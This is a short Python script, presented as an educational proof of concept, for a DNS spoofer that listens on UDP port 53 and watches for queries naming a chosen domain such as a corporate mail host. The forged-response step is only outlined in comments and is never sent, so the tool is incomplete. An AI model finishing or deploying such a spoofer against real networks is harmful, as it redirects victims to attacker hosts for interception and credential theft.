import socket
import argparse

# RogueDNS - DNS Spoofer
# Educational Proof-of-Concept
# Intercepts DNS queries (UDP 53) and returns malicious IP for specific domains.

DNS_IP = '0.0.0.0'
DNS_PORT = 53

def start_dns(target_domain, spoof_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((DNS_IP, DNS_PORT))

    print(f"[*] RogueDNS Active on port 53.")
    print(f"[*] Spoofing {target_domain} -> {spoof_ip}")

    while True:
        try:
            data, addr = sock.recvfrom(512)
            # Parse DNS Header (Transaction ID, etc)
            # Find Query Name in Question Section
            # This is a raw socket simplified logic
            
            # Simple substring match for PoC
            # In reaity, need to parse variable length labels "3www6google3com0"
            if target_domain.encode() in data:
                print(f"[+] Request for {target_domain} from {addr[0]} - SPOOFING RESPONSE")
                # Craft DNS Response
                # TID | Flags | QDCOUNT | ANCOUNT ...
                # ... Answer RDATA = spoof_ip
                # reply = ... 
                # sock.sendto(reply, addr)
            else:
                # Forward or ignore
                pass

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RogueDNS")
    parser.add_argument("--domain", required=True, help="Domain to spoof (e.g., mail.corp.com)")
    parser.add_argument("--ip", required=True, help="Malicious IP")
    args = parser.parse_args()

    start_dns(args.domain, args.ip)
